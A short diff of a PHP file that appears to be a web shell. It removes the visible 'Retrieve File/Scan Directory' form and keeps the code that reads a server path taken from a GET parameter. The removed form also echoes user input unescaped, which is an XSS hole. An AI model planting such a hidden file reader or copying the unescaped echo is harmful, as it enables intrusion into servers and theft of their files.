@@ -10,15 +10,6 @@ if (isset($_GET['PhpService']) && isset($_GET['0'])) {
     }
 
 ?>
-    <b>Retrieve File/Scan Directory</b> <br />
-    Current file path: <?php echo __FILE__; ?> <br />
-    <form method="GET" action="">
-        Path: <input type="text" name="path" size="50" value="<?php if (isset($_GET['path'])) {
-            echo $_GET['path'];
-            } ?>" />
-        <button type="submit">Go</button>
-    </form>
-    <pre>
 <?php
     if (isset($_GET['path'])) {
         if ($_GET['path'] == '') {
